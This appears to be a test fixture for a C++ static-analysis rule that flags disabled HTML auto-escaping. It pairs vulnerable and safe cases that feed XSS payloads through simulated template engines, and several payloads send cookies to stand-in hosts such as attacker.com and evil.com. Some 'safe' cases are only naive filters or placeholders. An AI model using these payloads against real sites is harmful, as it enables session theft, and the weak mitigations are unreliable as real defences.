# Understanding the Rule

The rule "cpp-do-not-disable-html-auto-escape" is designed to detect when HTML auto-escaping is disabled in C++ code, which could lead to Cross-Site Scripting (XSS) vulnerabilities (CWE-79). This is primarily a configuration/usage issue where disabling HTML auto-escape mechanisms can allow untrusted input to be rendered as HTML/JavaScript, potentially enabling XSS attacks.

In C++, this typically involves template engines or HTML rendering libraries where auto-escaping can be disabled.

```cpp
#include <iostream>
#include <string>
#include <cstdlib>
#include <vector>
#include <map>
#include <memory>

// Common template/HTML rendering library simulation
namespace TemplateEngine {
    class Template {
    public:
        Template(const std::string& tmpl) : template_str(tmpl), auto_escape(true) {}
        
        void setAutoEscape(bool value) {
            auto_escape = value;
        }
        
        bool getAutoEscape() const {
            return auto_escape;
        }
        
        std::string render(const std::map<std::string, std::string>& context) {
            std::string result = template_str;
            for (const auto& pair : context) {
                std::string placeholder = "{{" + pair.first + "}}";
                std::string value = pair.second;
                
                if (auto_escape) {
                    // Simple HTML escaping
                    value = escapeHtml(value);
                }
                
                size_t pos = result.find(placeholder);
                if (pos != std::string::npos) {
                    result.replace(pos, placeholder.length(), value);
                }
            }
            return result;
        }
        
    private:
        std::string template_str;
        bool auto_escape;
        
        std::string escapeHtml(const std::string& input) {
            std::string result;
            for (char c : input) {
                switch (c) {
                    case '&': result += "&amp;"; break;
                    case '<': result += "&lt;"; break;
                    case '>': result += "&gt;"; break;
                    case '"': result += "&quot;"; break;
                    case '\'': result += "&#39;"; break;
                    default: result += c;
                }
            }
            return result;
        }
    };
}

// HTTP request simulation
class HttpRequest {
public:
    HttpRequest() {}
    
    void setParameter(const std::string& name, const std::string& value) {
        params[name] = value;
    }
    
    std::string getParameter(const std::string& name) const {
        auto it = params.find(name);
        if (it != params.end()) {
            return it->second;
        }
        return "";
    }
    
private:
    std::map<std::string, std::string> params;
};

// HTML template library simulation
namespace HtmlLib {
    class HtmlTemplate {
    public:
        HtmlTemplate(const std::string& tmpl) : template_str(tmpl), escape_html(true) {}
        
        void disableHtmlEscape() {
            escape_html = false;
        }
        
        void enableHtmlEscape() {
            escape_html = true;
        }
        
        bool isHtmlEscapeEnabled() const {
            return escape_html;
        }
        
        std::string render(const std::map<std::string, std::string>& vars) {
            std::string result = template_str;
            for (const auto& pair : vars) {
                std::string placeholder = "{" + pair.first + "}";
                std::string value = pair.second;
                
                if (escape_html) {
                    value = escapeHtml(value);
                }
                
                size_t pos = 0;
                while ((pos = result.find(placeholder, pos)) != std::string::npos) {
                    result.replace(pos, placeholder.length(), value);
                    pos += value.length();
                }
            }
            return result;
        }
        
    private:
        std::string template_str;
        bool escape_html;
        
        std::string escapeHtml(const std::string& input) {
            std::string result;
            for (char c : input) {
                switch (c) {
                    case '&': result += "&amp;"; break;
                    case '<': result += "&lt;"; break;
                    case '>': result += "&gt;"; break;
                    case '"': result += "&quot;"; break;
                    case '\'': result += "&#39;"; break;
                    default: result += c;
                }
            }
            return result;
        }
    };
}

// Another template engine simulation
namespace Mustache {
    class Engine {
    public:
        Engine() : auto_escape(true) {}
        
        void setAutoEscape(bool value) {
            auto_escape = value;
        }
        
        std::string render(const std::string& tmpl, const std::map<std::string, std::string>& context) {
            std::string result = tmpl;
            for (const auto& pair : context) {
                std::string placeholder = "{{" + pair.first + "}}";
                std::string value = pair.second;
                
                if (auto_escape) {
                    value = escapeHtml(value);
                }
                
                size_t pos = 0;
                while ((pos = result.find(placeholder, pos)) != std::string::npos) {
                    result.replace(pos, placeholder.length(), value);
                    pos += value.length();
                }
            }
            return result;
        }
        
    private:
        bool auto_escape;
        
        std::string escapeHtml(const std::string& input) {
            std::string result;
            for (char c : input) {
                switch (c) {
                    case '&': result += "&amp;"; break;
                    case '<': result += "&lt;"; break;
                    case '>': result += "&gt;"; break;
                    case '"': result += "&quot;"; break;
                    case '\'': result += "&#39;"; break;
                    default: result += c;
                }
            }
            return result;
        }
    };
}
// {fact rule=autoescape-disabled@v1.0 defects=1}

// True Positive Examples (Vulnerable Code)

void bad_case_1() {
    HttpRequest request;
    request.setParameter("username", "<script>alert('XSS')</script>");
    
    TemplateEngine::Template tmpl("<div>Welcome, {{username}}!</div>");
    // ruleid: cpp-do-not-disable-html-auto-escape
    tmpl.setAutoEscape(false);
    
    std::map<std::string, std::string> context;
    context["username"] = request.getParameter("username");
    
    std::string html = tmpl.render(context);
    std::cout << html << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_2() {
    HttpRequest request;
    request.setParameter("comment", "Nice product! <script>stealCookies()</script>");
    
    HtmlLib::HtmlTemplate tmpl("<div>User comment: {comment}</div>");
    // ruleid: cpp-do-not-disable-html-auto-escape
    tmpl.disableHtmlEscape();
    
    std::map<std::string, std::string> vars;
    vars["comment"] = request.getParameter("comment");
    
    std::string output = tmpl.render(vars);
    std::cout << output << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_3() {
    HttpRequest request;
    request.setParameter("title", "<img src=x onerror=alert('XSS')>");
    
    Mustache::Engine engine;
    // ruleid: cpp-do-not-disable-html-auto-escape
    engine.setAutoEscape(false);
    
    std::map<std::string, std::string> context;
    context["title"] = request.getParameter("title");
    
    std::string html = engine.render("<h1>{{title}}</h1>", context);
    std::cout << html << std::endl;
}
// {/fact}

class CustomTemplate {
public:
    CustomTemplate(bool escapeHtml = true) : auto_escape(escapeHtml) {}
    
    void setEscaping(bool value) {
        auto_escape = value;
    }
    
    std::string process(const std::string& tmpl, const std::map<std::string, std::string>& vars) {
        // Template processing logic
        return "Processed template";
    }
    
private:
    bool auto_escape;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_4() {
    HttpRequest request;
    request.setParameter("content", "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>");
    
    CustomTemplate renderer;
    // ruleid: cpp-do-not-disable-html-auto-escape
    renderer.setEscaping(false);
    
    std::map<std::string, std::string> vars;
    vars["content"] = request.getParameter("content");
    
    std::string result = renderer.process("<div>{{content}}</div>", vars);
    std::cout << result << std::endl;
}
// {/fact}

class EmailTemplate {
public:
    EmailTemplate() : html_escape(true) {}
    
    void disableAutoEscape() {
        html_escape = false;
    }
    
    std::string renderEmail(const std::string& tmpl, const std::map<std::string, std::string>& data) {
        // Email rendering logic
        return "Rendered email";
    }
    
private:
    bool html_escape;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_5() {
    HttpRequest request;
    request.setParameter("name", "<script>alert('XSS')</script>");
    
    EmailTemplate emailer;
    // ruleid: cpp-do-not-disable-html-auto-escape
    emailer.disableAutoEscape();
    
    std::map<std::string, std::string> data;
    data["name"] = request.getParameter("name");
    
    std::string email = emailer.renderEmail("Hello {{name}},", data);
    std::cout << email << std::endl;
}
// {/fact}

namespace TemplateSystem {
    class Config {
    public:
        void setHtmlEscape(bool value) {
            html_escape_enabled = value;
        }
        
    private:
        bool html_escape_enabled = true;
    };
    
    class Renderer {
    public:
        Renderer(Config* cfg) : config(cfg) {}
        
        std::string render(const std::string& tmpl, const std::map<std::string, std::string>& vars) {
            // Rendering logic
            return "Rendered content";
        }
        
    private:
        Config* config;
    };
}
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_6() {
    HttpRequest request;
    request.setParameter("bio", "<iframe src='javascript:alert(`xss`)'></iframe>");
    
    TemplateSystem::Config config;
    // ruleid: cpp-do-not-disable-html-auto-escape
    config.setHtmlEscape(false);
    
    TemplateSystem::Renderer renderer(&config);
    
    std::map<std::string, std::string> vars;
    vars["bio"] = request.getParameter("bio");
    
    std::string output = renderer.render("<div>{{bio}}</div>", vars);
    std::cout << output << std::endl;
}
// {/fact}

class HtmlBuilder {
public:
    HtmlBuilder() : escape_enabled(true) {}
    
    void setEscapeHtml(bool value) {
        escape_enabled = value;
    }
    
    std::string buildHtml(const std::string& content) {
        // HTML building logic
        return "<div>" + content + "</div>";
    }
    
private:
    bool escape_enabled;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_7() {
    HttpRequest request;
    request.setParameter("message", "<script>alert(document.domain)</script>");
    
    HtmlBuilder builder;
    // ruleid: cpp-do-not-disable-html-auto-escape
    builder.setEscapeHtml(false);
    
    std::string html = builder.buildHtml(request.getParameter("message"));
    std::cout << html << std::endl;
}
// {/fact}

class WebView {
public:
    WebView() : auto_escape(true) {}
    
    void disableHtmlEscaping() {
        auto_escape = false;
    }
    
    void loadContent(const std::string& content) {
        // Load content into web view
        std::cout << "Loading content: " << content << std::endl;
    }
    
private:
    bool auto_escape;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_8() {
    HttpRequest request;
    request.setParameter("html", "<script>alert('XSS')</script>");
    
    WebView view;
    // ruleid: cpp-do-not-disable-html-auto-escape
    view.disableHtmlEscaping();
    
    view.loadContent(request.getParameter("html"));
}
// {/fact}

class MarkdownRenderer {
public:
    MarkdownRenderer() : escape_html(true) {}
    
    void setHtmlEscaping(bool value) {
        escape_html = value;
    }
    
    std::string renderToHtml(const std::string& markdown) {
        // Convert markdown to HTML
        return "<div>" + markdown + "</div>";
    }
    
private:
    bool escape_html;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_9() {
    HttpRequest request;
    request.setParameter("markdown", "# Title <script>alert('XSS')</script>");
    
    MarkdownRenderer renderer;
    // ruleid: cpp-do-not-disable-html-auto-escape
    renderer.setHtmlEscaping(false);
    
    std::string html = renderer.renderToHtml(request.getParameter("markdown"));
    std::cout << html << std::endl;
}
// {/fact}

class RichTextEditor {
public:
    RichTextEditor() : sanitize_html(true) {}
    
    void disableHtmlSanitization() {
        sanitize_html = false;
    }
    
    std::string getHtml(const std::string& content) {
        // Process rich text content
        return content;
    }
    
private:
    bool sanitize_html;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_10() {
    HttpRequest request;
    request.setParameter("content", "<div onclick='alert(\"XSS\")'>Click me</div>");
    
    RichTextEditor editor;
    // ruleid: cpp-do-not-disable-html-auto-escape
    editor.disableHtmlSanitization();
    
    std::string html = editor.getHtml(request.getParameter("content"));
    std::cout << html << std::endl;
}
// {/fact}

namespace HtmlProcessor {
    class Options {
    public:
        Options() : escape_html(true) {}
        
        void setEscapeHtml(bool value) {
            escape_html = value;
        }
        
        bool getEscapeHtml() const {
            return escape_html;
        }
        
    private:
        bool escape_html;
    };
    
    class Processor {
    public:
        Processor(const Options& opts) : options(opts) {}
        
        std::string process(const std::string& html) {
            // Process HTML
            return html;
        }
        
    private:
        Options options;
    };
}
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_11() {
    HttpRequest request;
    request.setParameter("html", "<a href='javascript:alert(1)'>Click me</a>");
    
    HtmlProcessor::Options options;
    // ruleid: cpp-do-not-disable-html-auto-escape
    options.setEscapeHtml(false);
    
    HtmlProcessor::Processor processor(options);
    std::string output = processor.process(request.getParameter("html"));
    std::cout << output << std::endl;
}
// {/fact}

class EmailComposer {
public:
    EmailComposer() : escape_html(true) {}
    
    void setAutoEscape(bool value) {
        escape_html = value;
    }
    
    std::string composeEmail(const std::string& template_str, const std::map<std::string, std::string>& data) {
        // Email composition logic
        return "Composed email";
    }
    
private:
    bool escape_html;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_12() {
    HttpRequest request;
    request.setParameter("body", "<script>document.write('<img src=\"http://attacker.com/collect?cookie='+document.cookie+'\">')</script>");
    
    EmailComposer composer;
    // ruleid: cpp-do-not-disable-html-auto-escape
    composer.setAutoEscape(false);
    
    std::map<std::string, std::string> data;
    data["body"] = request.getParameter("body");
    
    std::string email = composer.composeEmail("Dear customer, {{body}}", data);
    std::cout << email << std::endl;
}
// {/fact}

class HtmlFormatter {
public:
    HtmlFormatter() : escape_enabled(true) {}
    
    void disableEscaping() {
        escape_enabled = false;
    }
    
    std::string format(const std::string& content) {
        // Format content to HTML
        return "<div>" + content + "</div>";
    }
    
private:
    bool escape_enabled;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_13() {
    HttpRequest request;
    request.setParameter("text", "<img src=x onerror=alert(document.cookie)>");
    
    HtmlFormatter formatter;
    // ruleid: cpp-do-not-disable-html-auto-escape
    formatter.disableEscaping();
    
    std::string html = formatter.format(request.getParameter("text"));
    std::cout << html << std::endl;
}
// {/fact}

class TemplateConfig {
public:
    TemplateConfig() : auto_escape(true) {}
    
    void setEscapeMode(bool enable) {
        auto_escape = enable;
    }
    
private:
    bool auto_escape;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_14() {
    HttpRequest request;
    request.setParameter("content", "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>");
    
    TemplateConfig config;
    // ruleid: cpp-do-not-disable-html-auto-escape
    config.setEscapeMode(false);
    
    // Use config to render template with user input
    std::cout << "Template rendered with user content: " << request.getParameter("content") << std::endl;
}
// {/fact}

class HtmlRenderOptions {
public:
    HtmlRenderOptions() : escape(true) {}
    
    void setEscape(bool value) {
        escape = value;
    }
    
private:
    bool escape;
};
// {fact rule=autoescape-disabled@v1.0 defects=1}

void bad_case_15() {
    HttpRequest request;
    request.setParameter("html", "<div onmouseover='alert(\"XSS\")'>Hover me</div>");
    
    HtmlRenderOptions options;
    // ruleid: cpp-do-not-disable-html-auto-escape
    options.setEscape(false);
    
    // Use options to render HTML
    std::cout << "Rendering HTML: " << request.getParameter("html") << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

// True Negative Examples (Safe Code)

void good_case_1() {
    HttpRequest request;
    request.setParameter("username", "<script>alert('XSS')</script>");
    
    TemplateEngine::Template tmpl("<div>Welcome, {{username}}!</div>");
    // ok: cpp-do-not-disable-html-auto-escape
    tmpl.setAutoEscape(true);
    
    std::map<std::string, std::string> context;
    context["username"] = request.getParameter("username");
    
    std::string html = tmpl.render(context);
    std::cout << html << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_2() {
    HttpRequest request;
    request.setParameter("comment", "Nice product! <script>stealCookies()</script>");
    
    HtmlLib::HtmlTemplate tmpl("<div>User comment: {comment}</div>");
    // ok: cpp-do-not-disable-html-auto-escape
    tmpl.enableHtmlEscape();
    
    std::map<std::string, std::string> vars;
    vars["comment"] = request.getParameter("comment");
    
    std::string output = tmpl.render(vars);
    std::cout << output << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_3() {
    HttpRequest request;
    request.setParameter("title", "<img src=x onerror=alert('XSS')>");
    
    Mustache::Engine engine;
    // Auto-escape is enabled by default, no need to explicitly set it
    // ok: cpp-do-not-disable-html-auto-escape
    std::map<std::string, std::string> context;
    context["title"] = request.getParameter("title");
    
    std::string html = engine.render("<h1>{{title}}</h1>", context);
    std::cout << html << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_4() {
    HttpRequest request;
    request.setParameter("content", "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>");
    
    CustomTemplate renderer;
    // ok: cpp-do-not-disable-html-auto-escape
    renderer.setEscaping(true);
    
    std::map<std::string, std::string> vars;
    vars["content"] = request.getParameter("content");
    
    std::string result = renderer.process("<div>{{content}}</div>", vars);
    std::cout << result << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_5() {
    HttpRequest request;
    request.setParameter("name", "<script>alert('XSS')</script>");
    
    // Using a custom sanitizer instead of disabling auto-escape
    // ok: cpp-do-not-disable-html-auto-escape
    std::string sanitized_name = request.getParameter("name");
    for (size_t i = 0; i < sanitized_name.length(); i++) {
        if (sanitized_name[i] == '<' || sanitized_name[i] == '>' || 
            sanitized_name[i] == '"' || sanitized_name[i] == '\'' || 
            sanitized_name[i] == '&') {
            sanitized_name[i] = '_';
        }
    }
    
    std::cout << "Hello " << sanitized_name << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_6() {
    HttpRequest request;
    request.setParameter("bio", "<iframe src='javascript:alert(`xss`)'></iframe>");
    
    TemplateSystem::Config config;
    // ok: cpp-do-not-disable-html-auto-escape
    config.setHtmlEscape(true);
    
    TemplateSystem::Renderer renderer(&config);
    
    std::map<std::string, std::string> vars;
    vars["bio"] = request.getParameter("bio");
    
    std::string output = renderer.render("<div>{{bio}}</div>", vars);
    std::cout << output << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_7() {
    HttpRequest request;
    request.setParameter("message", "<script>alert(document.domain)</script>");
    
    // Using a different approach that doesn't involve disabling auto-escape
    // ok: cpp-do-not-disable-html-auto-escape
    std::string message = request.getParameter("message");
    std::string safe_message;
    for (char c : message) {
        switch (c) {
            case '&': safe_message += "&amp;"; break;
            case '<': safe_message += "&lt;"; break;
            case '>': safe_message += "&gt;"; break;
            case '"': safe_message += "&quot;"; break;
            case '\'': safe_message += "&#39;"; break;
            default: safe_message += c;
        }
    }
    
    std::cout << "<div>" << safe_message << "</div>" << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_8() {
    HttpRequest request;
    request.setParameter("html", "<script>alert('XSS')</script>");
    
    WebView view;
    // Auto-escape is enabled by default, no need to disable it
    // ok: cpp-do-not-disable-html-auto-escape
    
    // Sanitize input before loading
    std::string input = request.getParameter("html");
    std::string sanitized;
    for (char c : input) {
        if (c == '<' || c == '>' || c == '&' || c == '"' || c == '\'') {
            sanitized += ' ';
        } else {
            sanitized += c;
        }
    }
    
    view.loadContent(sanitized);
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_9() {
    HttpRequest request;
    request.setParameter("markdown", "# Title <script>alert('XSS')</script>");
    
    MarkdownRenderer renderer;
    // ok: cpp-do-not-disable-html-auto-escape
    renderer.setHtmlEscaping(true);
    
    std::string html = renderer.renderToHtml(request.getParameter("markdown"));
    std::cout << html << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_10() {
    HttpRequest request;
    request.setParameter("content", "<div onclick='alert(\"XSS\")'>Click me</div>");
    
    // Using a whitelist approach instead of disabling sanitization
    // ok: cpp-do-not-disable-html-auto-escape
    std::string content = request.getParameter("content");
    std::string safe_tags = "<p><br><b><i><u>";
    
    // Simple whitelist implementation (in real code, use a proper HTML parser)
    std::string sanitized;
    bool in_tag = false;
    bool is_safe_tag = false;
    std::string current_tag;
    
    for (char c : content) {
        if (c == '<') {
            in_tag = true;
            current_tag = "<";
            continue;
        }
        
        if (in_tag) {
            current_tag += c;
            if (c == '>') {
                in_tag = false;
                if (safe_tags.find(current_tag) != std::string::npos) {
                    sanitized += current_tag;
                } else {
                    sanitized += "&lt;" + current_tag.substr(1, current_tag.length() - 2) + "&gt;";
                }
            }
        } else {
            sanitized += c;
        }
    }
    
    std::cout << sanitized << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_11() {
    HttpRequest request;
    request.setParameter("html", "<a href='javascript:alert(1)'>Click me</a>");
    
    HtmlProcessor::Options options;
    // ok: cpp-do-not-disable-html-auto-escape
    options.setEscapeHtml(true);
    
    HtmlProcessor::Processor processor(options);
    std::string output = processor.process(request.getParameter("html"));
    std::cout << output << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_12() {
    HttpRequest request;
    request.setParameter("body", "<script>document.write('<img src=\"http://attacker.com/collect?cookie='+document.cookie+'\">')</script>");
    
    // Using a dedicated HTML sanitizer library (simulated)
    // ok: cpp-do-not-disable-html-auto-escape
    class HtmlSanitizer {
    public:
        static std::string sanitize(const std::string& html) {
            // In a real implementation, this would use a proper HTML parser
            std::string result;
            for (char c : html) {
                switch (c) {
                    case '<': result += "&lt;"; break;
                    case '>': result += "&gt;"; break;
                    case '"': result += "&quot;"; break;
                    case '\'': result += "&#39;"; break;
                    case '&': result += "&amp;"; break;
                    default: result += c;
                }
            }
            return result;
        }
    };
    
    std::string safe_body = HtmlSanitizer::sanitize(request.getParameter("body"));
    std::cout << "Email body: " << safe_body << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_13() {
    HttpRequest request;
    request.setParameter("text", "<img src=x onerror=alert(document.cookie)>");
    
    HtmlFormatter formatter;
    // Auto-escape is enabled by default
    // ok: cpp-do-not-disable-html-auto-escape
    
    // Additional validation
    std::string text = request.getParameter("text");
    if (text.find("<script") != std::string::npos || 
        text.find("javascript:") != std::string::npos ||
        text.find("onerror=") != std::string::npos) {
        text = "Potentially malicious content detected";
    }
    
    std::string html = formatter.format(text);
    std::cout << html << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_14() {
    HttpRequest request;
    request.setParameter("content", "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>");
    
    // Using Content Security Policy instead of relying solely on escaping
    // ok: cpp-do-not-disable-html-auto-escape
    std::string csp_header = "Content-Security-Policy: default-src 'self'; script-src 'self'";
    std::cout << "Setting header: " << csp_header << std::endl;
    
    TemplateConfig config;
    // Keep auto-escape enabled
    
    std::string content = request.getParameter("content");
    std::cout << "Safely rendering content with CSP protection" << std::endl;
}
// {/fact}
// {fact rule=autoescape-disabled@v1.0 defects=0}

void good_case_15() {
    HttpRequest request;
    request.setParameter("html", "<div onmouseover='alert(\"XSS\")'>Hover me</div>");
    
    // Using a combination of escaping and attribute filtering
    // ok: cpp-do-not-disable-html-auto-escape
    std::string html = request.getParameter("html");
    
    // Remove potentially dangerous attributes (simplified example)
    size_t pos = 0;
    while ((pos = html.find("on", pos)) != std::string::npos) {
        size_t attr_start = pos;
        if (attr_start > 0 && html[attr_start-1] == ' ') {
            size_t attr_end = html.find("=", attr_start);
            if (attr_end != std::string::npos) {
                size_t value_end = html.find(" ", attr_end);
                if (value_end == std::string::npos) {
                    value_end = html.find(">", attr_end);
                }
                if (value_end != std::string::npos) {
                    html.erase(attr_start, value_end - attr_start);
                    continue;
                }
            }
        }
        pos++;
    }
    
    std::cout << "Sanitized HTML: " << html << std::endl;
}
// {/fact}

int main() {
    // This is just a placeholder main function
    return 0;
}